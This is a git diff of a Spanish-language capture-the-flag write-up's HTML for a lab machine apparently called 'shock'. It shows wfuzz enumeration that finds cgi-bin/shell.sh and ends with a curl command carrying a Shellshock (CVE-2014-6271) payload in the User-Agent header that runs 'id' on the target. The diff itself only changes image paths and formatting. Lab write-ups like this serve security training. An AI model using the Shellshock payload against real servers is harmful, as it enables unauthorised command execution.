@@ -191,7 +191,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>|_http-title: Site doesn&#39;t have a title (text/html).
 </span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </span></span></code></pre></div><h3 id="http">HTTP</h3>
-<p><img src="/../machines/nyx/nyx_shock/http.png" alt="http.png"></p>
+<p><img src="/../machines/nyx/shock/http.webp" alt="http.png"></p>
 <p>Después de enumerar sin encontrar nada lanzo wfuzz poniendo una barra al final <code>/</code> para que vuelva a escanear sin saltarse ninguna ruta. A veces puede pasar que sino pones la barra final no te encuentra aglunas rutas.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ wfuzz -c -t 200 --hc=404 --hw=1 -w /usr/share/seclists/Discovery/Web-Content/common.txt &#34;http://192.168.1.14/FUZZ/&#34;
 </span></span><span style="display:flex;"><span>********************************************************
@@ -204,7 +204,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>  
 </span></span><span style="display:flex;"><span>000001038:   403        9 L      28 W       277 Ch      &#34;cgi-bin/&#34;                                                      
 </span></span><span style="display:flex;"><span>000003710:   403        9 L      28 W       277 Ch      &#34;server-status&#34;
-</span></span></code></pre></div><p>La carpeta <code>cgi-bin</code> es una carpeta utilizada para alojar scripts que interactuarán con un navegador web, en esta carpeta se suelen poner archivos <code>.sh, .cgi</code> entre otros, así que hago una búsqueda de extensiones.</p>
+</span></span></code></pre></div><p>La carpeta <strong>cgi-bin</strong> es una carpeta utilizada para alojar scripts que interactuarán con un navegador web, en esta carpeta se suelen poner archivos <strong>.sh, .cgi</strong> entre otros, así que hago una búsqueda de extensiones.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ wfuzz -c -t 200 --hc=404 --hw=1 -w /usr/share/seclists/Discovery/Web-Content/common.txt -z list,sh-cgi &#34;http://192.168.1.14/cgi-bin/FUZZ.FUZ2Z&#34;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>********************************************************
@@ -216,8 +216,8 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>=====================================================================
 </span></span><span style="display:flex;"><span>                                 
 </span></span><span style="display:flex;"><span>000014961:   500        16 L     77 W       610 Ch      &#34;shell - sh&#34;
-</span></span></code></pre></div><p>Si intento ver el archivo desde firefox veo el sigiente error.
-<img src="/../machines/nyx/nyx_shock/internal_server_error.png" alt="internal server error"></p>
+</span></span></code></pre></div><p>Si intento ver el archivo desde firefox veo el sigiente error.</p>
+<p><img src="/../machines/nyx/shock/internal_server_error.webp" alt="internal_server_error"></p>
 <p>Buscando un poco por internet he encontrado este <a href="https://github.com/opsxcq/exploit-CVE-2014-6271">artículo</a>.</p>
 <p>Puedo ejecutar comandos de la siguiente forma:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -H &#34;user-agent: () { :; }; echo;echo; /bin/bash -c &#39;id&#39;&#34; http://192.168.1.14/cgi-bin/shell.sh
